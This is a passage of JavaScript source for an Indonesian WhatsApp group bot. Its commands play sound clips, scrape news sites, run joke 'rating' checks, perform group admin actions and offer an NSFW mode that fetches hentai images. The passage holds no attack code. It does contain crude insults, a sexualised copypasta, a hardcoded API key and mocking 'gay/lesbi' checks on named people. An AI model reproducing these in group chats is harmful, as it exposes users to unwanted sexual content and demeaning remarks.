if (isBan) throw sticBanLu(from)
 mo = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
 mu = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'slebew': {
if (isBan) throw sticBanLu(from)
 me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
 muku = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
 meke = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
 moko = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
case 'anime': {
if (isBan) throw sticBanLu(from) 
if (!text) return m.reply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
anu = await fetchJson(`https://api.jikan.moe/v4/anime?q=${text}`)
let sections = [] 
for (let i of anu.data) {
const list = {title: `${i.title}`,
rows: [
{
 title: `${i.title}`, 
 rowId: `${prefix}animee ${i.mal_id}`,
 description: `${i.synopsis}`
}, 
]
}
sections.push(list) 
}
const sendm =haikal.sendMessage(
 m.chat, 
 {
text: `*Search Results From* ${text}`,
footer: botname,
title: "*▊▊▊ANIME▊▊▊*",
buttonText: "CLICK HERE",
sections
 }, { quoted : m })
}
break
//=================================================//
case 'translate': case 'terjemahan': case 'tr': {
if (isBan) throw sticBanLu(from)
if (!args.join(" ")) return m.reply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//=================================================//
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw sticBanLu(from)
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
haikal.sendMessage(m.chat, { image: anu, caption: `NihKak` }, { quoted: m})
}
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw sticBanLu(from)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
haikal.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
case 'darkjoke':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme2':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'ss': case 'ssweb': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'fajar-news':
if (isBan) throw sticBanLu(from)
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) throw sticBanLu(from)
var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) throw sticBanLu(from)
var res = await Darkjokes()
teks = "*Darkjokes*"
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted: m })
break
//=================================================//
case 'cnn-news':
if (isBan) throw sticBanLu(from)
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (isBan) throw sticBanLu(from)
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'tribun-news':
if (isBan) throw sticBanLu(from)
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'indozone-news':
if (isBan) throw sticBanLu(from)
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'kompas-news':
if (isBan) throw sticBanLu(from)
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'detik-news':
if (isBan) throw sticBanLu(from)
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'daily-news':
if (isBan) throw sticBanLu(from)
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'inews-news':
if (isBan) throw sticBanLu(from)
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone-news':
if (isBan) throw sticBanLu(from)
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'sindo-news':
if (isBan) throw sticBanLu(from)
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo-news':
if (isBan) throw sticBanLu(from)
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'antara-news':
if (isBan) throw sticBanLu(from)
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "kontan-news":
if (isBan) throw sticBanLu(from)
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "merdeka-news":
if (isBan) throw sticBanLu(from)
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) throw sticBanLu(from)
var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted: m })
break
//=================================================//
/*Random*/
 case 'apakah':
 if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })
break
//=================================================//
case 'bagaimanakah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })
break
//=================================================//
case 'rate':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
haikal.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })
break
//=================================================//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })
break
//=================================================//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)
if (!q) return reply (`Contoh : .wangy haikal`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 m.reply(awikwok)
break
//=================================================//
case 'cekmati':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
//=================================================//
case 'sc': {
if (isBan) throw sticBanLu(from)
reply('Telegram : https://t.me/haikal857\n\n Sc Bot : https://youtube.com/c/@ZallMods')
}
break
//=================================================//
case 'chat': {
if (isBan) throw sticBanLu(from)
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
haikal.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
haikal.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'archive') {
haikal.chatModify({archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
haikal.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'read') {
haikal.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unread') {
haikal.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'delete') {
haikal.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
//=================================================//
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw sticBanLu(from)
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
//=================================================//
case 'mediafire': {
if (isBan) throw sticBanLu(from)
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*ZALL MODS*`
reply(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted: m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
//=================================================//
case 'jodohku': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: ments})
}
break
//=================================================//
case 'jadian': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: menst})
}
break
//=================================================//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
haikal.sendMessage(from, reactionMessage)
}
break
//=================================================//
case 'join': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'keluar': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
await haikal.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'nsfw': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Sudah Aktif')
ntnsfw.push(from)
m.reply('Sukses Telah mengaktifkan Nsfw Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Sudah Non Aktif')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
m.reply('Sukses Mematikan Nsfw di group ini')
} else {
let buttonsntnsfw = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttonsntnsfw, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*WELCOME\n\n
trap
gasm
nwaifu
hneko `, `${global.botname}`, m)
}
}
break
//=================================================//
case 'trap' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
 let trapbot = [
 {buttonId: `trap`, buttonText: {displayText: `Next ⚡`}, type: 1},
 ]
let button2Messages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
buttons: trapbot,
headerType: 1
}
 await haikal.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'hentai-neko' :
case 'hneko' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
 {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
 ]
let button3Messages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
buttons: hnekobot,
headerType: 1
} 
 await haikal.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'hentai-waifu' :
case 'nwaifu' :
if (isBan) throw sticBanLu(from)
